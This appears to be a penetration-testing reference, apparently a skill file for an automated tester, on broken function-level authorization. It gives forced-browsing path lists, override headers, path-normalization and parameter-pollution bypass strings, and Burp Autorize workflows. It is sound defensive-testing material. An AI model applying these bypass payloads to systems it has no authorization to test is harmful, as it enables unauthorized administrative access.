# BFLA, Forced Browsing, Header/Path Bypass, and the Autorize Method

## Function-level authorization (BFLA)

The target is **functions**, not objects. Build the function inventory from the
admin session (menus, API calls, JS route tables — grep bundles for
`path:`/`route(`/`fetch(`), then replay each admin function as user/anon.

Classic BFLA shapes:
- `POST /api/admin/users` (create user) replayed with a user token -> 201.
- `GET /api/users` (list all) protected, but `GET /api/users/export` is not.
- The **mobile/partner API** (`/api/mobile/v1/...`, different host) implements
  the same functions without the checks the web API has.
- Older versions: `/api/v1/admin/...` unprotected while `/api/v3/` is — always
  downgrade the version segment.

Method/content-type toggles when the exact replay is blocked:
```
POST -> PUT -> PATCH -> DELETE -> GET (params in query)
X-HTTP-Method-Override: PUT        (header, with POST)
_method=PUT                        (body field)
Content-Type: application/json <-> application/x-www-form-urlencoded <-> text/xml <-> multipart/form-data
```

## Forced browsing

UI hiding ≠ authorization. Request protected paths directly as low-priv/anon.
Seed list (combine with ffuf/feroxbuster output and JS-extracted routes):

```
/admin /admin/ /administrator /manage /management /manager /console
/dashboard /panel /cp /backend /backoffice /internal /private /secure
/admin/login /admin/index /admin/users /admin/config /admin/export
/api/admin /api/internal /api/v1/admin /api/debug /api/users
/actuator /actuator/env /actuator/heapdump    (Spring)
/debug /trace /console /_profiler              (frameworks)
/phpmyadmin /pma /wp-admin /user/admin
/settings /config /setup /install /migrate
```

Also force-browse **multi-step flows**: jump straight to step 3
(`/checkout/complete`, `/wizard/finish`, `/kyc/approved`) skipping the gate at
step 2 — authorization by sequence is business-logic access control (WSTG-BUSL
overlap, still report under ATHZ when it grants privilege).

## Header-based authorization bypass

Send the blocked request with each of these added (one at a time, then combos).
These work when a front proxy/WAF enforces the path but the backend trusts
override headers:

```
X-Original-URL: /admin            (send the request to / or any 200 path)
X-Rewrite-URL: /admin
X-Override-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 127.0.0.1, 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Proto: https
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Host: 127.0.0.1
True-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1;host=127.0.0.1
Referer: https://example.com/admin     (referer-based "auth")
```

`X-Original-URL` technique in full: `POST /` with header `X-Original-URL: /admin/delete-user?id=1042`
— the frontend sees `/`, the backend (IIS/Symfony-style) routes the header value.

## Path normalization bypass

The access rule matches a literal path; the backend normalizes differently:

```
/admin/            trailing slash
/admin/.           /./admin          /admin/..;/
/%2e/admin         /admin%20         /admin%09
/admin%00          /admin.json       /admin;/        /admin;x=y/
/ADMIN  /Admin     (case-insensitive filesystem / case-sensitive rule)
/%2561dmin         (double URL-encode: %25 -> %, %61 -> a)
/public/..%2fadmin /anything/../admin
//admin  /\admin   /./admin/./
/admin?             /admin#            /admin/x/..     
```

Nginx/Tomcat mismatch favorites: `/admin;/` and `/..;/admin` (Tomcat treats `;`
as path-param delimiter); `/%252e%252e%252f` double-encoded traversal through
a reverse proxy.

## HTTP parameter pollution (HPP) for authz

Duplicate the checked parameter — different components pick different
occurrences (first/last/concatenated):

```
GET /api/orders?user_id=<A_ID>&user_id=<B_ID>
GET /api/orders?user_id=<B_ID>&user_id=<A_ID>
POST body: user_id=<A_ID>&user_id=<B_ID>
JSON duplicate keys: {"user_id": <A_ID>, "user_id": <B_ID>}   (last-key-wins parsers)
Mixed channels: ?user_id=<A_ID> in query + user_id=<B_ID> in body
Array smuggling: user_id[]=<B_ID>, user_id={"$ne":null} (NoSQL-adjacent)
```

## The Autorize / AuthMatrix / Auth Analyzer method (Burp)

All three implement the same loop as `scripts/authz_matrix.py`, live in the proxy:

- **Autorize** (BApp): paste the *low-priv* identity's `Cookie`/`Authorization`
  header into the extension config, enable "Intercept requests from Repeater/Proxy",
  then browse the app as the *high-priv* user. Every proxied request is auto-replayed
  (a) with the low-priv header and (b) unauthenticated. The table shows
  `Bypassed!` (red — same-length/similar success), `Is enforced!` (green),
  `Enforcement might be enforced` (yellow — inspect manually). Set *enforcement
  detectors* (a string/regex that only appears in denied responses, e.g.
  `"access denied"` or the login-form title) to kill yellow noise. Filter out
  static files via interception filters.
- **AuthMatrix** (BApp): define users (cookies/headers/CSRF) and roles as a
  grid, add requests, check which roles *should* succeed, run — the grid turns
  red where an unchecked role succeeded. Best for regression-style authz suites;
  supports chained CSRF-token extraction per user.
- **Auth Analyzer** (BApp): like Autorize but with automatic parameter
  extraction (grabs fresh CSRF tokens/session values per identity from previous
  responses) — use it when per-request tokens break naive replay.
- **ZAP** equivalent: the Access Control Testing add-on (define users in a
  context, set access rules, run the comparison scan).

Workflow: run Autorize while walking the app as admin -> export/triage the
red+yellow rows -> re-verify each in Repeater by hand-swapping the header ->
feed the confirmed set into `authz_matrix.py` requests JSON for a reproducible
matrix and rupu emission (work units / `assets.mark` / `findings.report` — see
`rupu.md`).

## Session-mechanics gotchas (false positives/negatives)

- **CSRF tokens** are per-session: replaying A's token under B's cookie yields
  403 that is *CSRF* enforcement, not authz. Fetch a fresh token as B first
  (Auth Analyzer automates this).
- **200-with-error-page**: many apps return HTTP 200 containing "not authorized"
  — that's why the matrix hashes bodies and the `REVIEW` class exists. Define a
  deny-regex when triaging.
- **Redirects**: a 302 to `/login` is ENFORCED; a 302 to the resource is not.
  Never auto-follow redirects during comparison (the script does not).
- Sticky caches/CDNs can serve A's cached response to B — add a cache-buster
  query param when in doubt.

## Classification

- BFLA / missing function-level check: WSTG-ATHZ-02, CWE-285 (or CWE-284 when
  anon succeeds), OWASP API5:2023.
- Vertical privilege escalation (self-promotion, role tamper): WSTG-ATHZ-03, CWE-269.
- Header/path bypass of an access rule: WSTG-ATHZ-02, CWE-285 — evidence must
  show the blocked baseline AND the bypassed exchange.

Record each via the `finding-report` skill (payload shape in `rupu.md`); mark
the bypassed route `assets.mark` depth `exploited`.
